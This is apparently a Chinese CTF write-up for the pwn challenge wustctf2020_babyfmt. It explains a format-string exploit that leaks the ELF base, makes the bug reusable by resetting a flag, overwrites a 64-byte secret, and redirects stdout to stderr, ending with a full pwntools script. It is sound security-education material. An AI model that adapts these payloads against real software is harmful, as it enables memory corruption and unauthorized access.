checksec

![image-20210419145200453](https://static.hack1s.fun/images/2021/04/19/image-20210419145200453.png)

main函数中首先调用了一个`initial`函数

这个函数从`/dev/urandom`读随机数到`secret`中

![image-20210419145509954](https://static.hack1s.fun/images/2021/04/19/image-20210419145509954.png)

之后调用ask_time函数可以输入几次时间

![image-20210419145830017](https://static.hack1s.fun/images/2021/04/19/image-20210419145830017.png)

然后就是一个循环，显示一个菜单；

其中选项2可以输入格式化字符串，也会执行格式化字符串

![image-20210419145914710](https://static.hack1s.fun/images/2021/04/19/image-20210419145914710.png)

选项3会比较一个变量的值是否与secret相等，是的话就输出flag

![image-20210419145948777](https://static.hack1s.fun/images/2021/04/19/image-20210419145948777.png)

但是这里也有一个坑，在输出flag之前用`close(1)`关闭了输出

所以需要想办法把stdout转过来



main函数中对每一个选单有执行次数限制

每一个选单运行一边之后都会修改一个对应变量的值为1

之后再检查如果发现是1的话就会直接退出

在bss段上存储着secret

![image-20210419165336751](https://static.hack1s.fun/images/2021/04/19/image-20210419165336751.png)

同时bss段上还存在几个指针，是stdin、stdout、stderr的指针

我们可以尝试把stdout修改为stderr的值



下面总结一下，程序的障碍在于：

- 格式化字符串只能执行一次；
- 泄漏flag的函数关闭了stdout；
- 开启了随机化



对应的解决方法：

1. 首先每一次通过格式化字符串修改fmt_attack中的a1为0，使其可以重复执行；
2. 另外在每一次执行时修改secret的值，使其变成一个固定的数；不过由于secret长度为0x40，即64字节，即使是一次写8字节也要写8次；
3. 利用leak泄漏出stdout的地址，克服随机化；
4. 将secret修改为一个已知的值后，修改stdout指针为stderr；



## 利用输入time泄漏地址

除此之外的难点就在于随机化了，需要泄漏一个程序段内的值；

这时可以发现输入time的那个地方，如果直接输入一个字母，不符合`%ld`的格式，就不会影响栈上的值；

能够直接输出三个原本栈上的值；

输入time泄漏出来的两个地址

![image-20210419213158056](https://static.hack1s.fun/images/2021/04/19/image-20210419213158056.png)

一个是`_start`函数的起始地址，另一个是`initial`函数中间的地址

这两个都在程序的text段中

![image-20210419213315467](https://static.hack1s.fun/images/2021/04/19/image-20210419213315467.png)

通过计算泄漏的这个值在程序本身中的偏移，可以计算出来stdin、stdout、stderr以及secret的位置；



## 循环格式化字符串修改secret

首先输入一堆%p得到字符串本身偏移是8

![image-20210419211319219](https://static.hack1s.fun/images/2021/04/19/image-20210419211319219.png)

运行到`fmt_attack`中的`printf`时可以看到a1的偏移（就是`[rbp-0x40]`）为7

![image-20210419221351935](https://static.hack1s.fun/images/2021/04/19/image-20210419221351935.png)

下面是循环运行格式化字符串攻击，每一次修改掉a1为0，以及修改secret中8字节为0

```python
for i in range(8):
    payload = "%7$lln" + "%11$lln"
    payload = payload.ljust(24,"a")
    # %7用来修改a1为0, %11用来修改secret

    payload = bytes(payload,'ascii')
    payload += p64(secret_addr+i*8)

    io.recvuntil('>>')
    io.sendline('2')
    io.send(payload)
```



![image-20210420211314449](https://static.hack1s.fun/images/2021/04/20/image-20210420211314449.png)

可以看到我们这里确实执行了8次格式化字符串的菜单，这说明修改a1为0成功了



## leak泄漏stdout地址



这个leak的选项可以输入一个地址，泄漏出这个地址的一个字节；

我们需要修改的是stdout的地址，要将其修改为stderr

由于stderr和stdout很大概率是挨在一起的，他们两个可能只有最后的低16位会有区别

我们运行两遍看一下，第一次运行：

![image-20210420195126308](https://static.hack1s.fun/images/2021/04/20/image-20210420195126308.png)

第二次运行：

![image-20210420195227001](https://static.hack1s.fun/images/2021/04/20/image-20210420195227001.png)

看这两次中的stderr，随机化变化从`0x7fe7744235c0`变为`0x7fe93945a5c0`

最低12位是不变的，都是`5c0`，这是因为ASLR的随机化是页级别的，而一页一般是4096字节，正好是12位



再看一次中的stderr和stdout

两者之间的差异`0x7fe7744235c0`和`0x7fe7744236a0`只有最低的16位可能会变化

并且前面我们知道了最低的12位在随机化中是不变的，那么我们可以在运行脚本前首先泄漏出最低的12位作为已知内容；

那么实际上就只有`xxxx 0000 0000 0000`这样的12-16位是需要知道的内容了；

这正好就可以用到leak可以泄漏的一个字节，把这里的12-16位泄漏出来（实际上会输出的8-16位，不过8-12位是固定的，我们需要的是这一个字节中的一半）



那么就按照这个思路做一下，看看最低8位是什么

```python
io.recvuntil('>>')
io.sendline('1')

io.send(p64(stderr_addr))
leak = io.recv(1)
```

可以看到这两位是`\xc0`，这也和我们上面debug看到的是一致的

![image-20210420203143118](https://static.hack1s.fun/images/2021/04/20/image-20210420203143118.png)

所以在脚本中可以用到的payload就是下面这样

```python
io.recvuntil('>>')
io.sendline('1')

io.send(p64(stderr_addr+1))
leak = ord(io.recv(1).decode('ascii')) << 8 + 0xc0
```

这样我们现在就知道了stderr的低16位，这正是stderr和stdout可能会出现差别的地方

这里需要注意的是这两个字节可能本地和远程是不同的，需要手动再调一下



## 格式化字符串修改stdout

那么需要做的事情就是利用格式化字符串的漏洞修改stdout的第16位为stderr的第16位

payload

```python
payload = "%7$lln" + "%" + str(leak) + "c" + "%11$hn"
payload = payload.ljust(24,"a")
payload = bytes(payload,'ascii')
print(str(payload))
payload = payload + p64(stdout_addr)
io.recvuntil('>>')
io.sendline('2')
io.send(payload)
```



## 结果

最后做的本地打通了，但是远程有问题，在循环那里就broken pipe了，不知道怎么回事

又比较了一下别人的WP，感觉没什么差别呀

```python
from pwn import *

io = process('./wustctf2020_babyfmt')
#io = remote('node3.buuoj.cn',26157)
context.log_level = 'debug'

secret = 0x202060
stdout = 0x202020
stderr = 0x202040

start = 0x9e0


io.recvuntil('time:')
io.send('a')

io.recvuntil('is ')
start_addr = int(io.recvuntil(':')[:-1])

elf_base = start_addr - start

secret_addr = elf_base + secret
stdout_addr = elf_base + stdout
stderr_addr = elf_base + stderr
success('ELF Base: '+str(hex(elf_base)))


for i in range(8):
    payload = "%7$lln" + "%11$lln"
    payload = payload.ljust(24,"a")
    # %7用来修改a1为0, %11用来修改secret

    payload = bytes(payload,'ascii')
    payload += p64(secret_addr+i*8)

    io.recvuntil('>>')
    io.sendline('2')
    io.send(payload)


io.recvuntil('>>')
io.sendline('1')

io.send(p64(stderr_addr+1))
#io.send(p64(stderr_addr))
#leak = io.recv(1)

leak = (ord(io.recv(1))<<8) + 0xc0
#leak = ord('\xe5')<<8 + 0x40
success("leak: "+str(leak))

payload = "%7$lln" + "%" + str(leak) + "c" + "%11$hn"
payload = payload.ljust(24,"a")
payload = bytes(payload,'ascii')
print(str(payload))
payload = payload + p64(stdout_addr)
io.recvuntil('>>')
io.sendline('2')
io.send(payload)

io.sendline('3')
io.send('\x00'*0x40)

io.interactive()
```

本地的效果

![image-20210420233900176](https://static.hack1s.fun/images/2021/04/20/image-20210420233900176.png)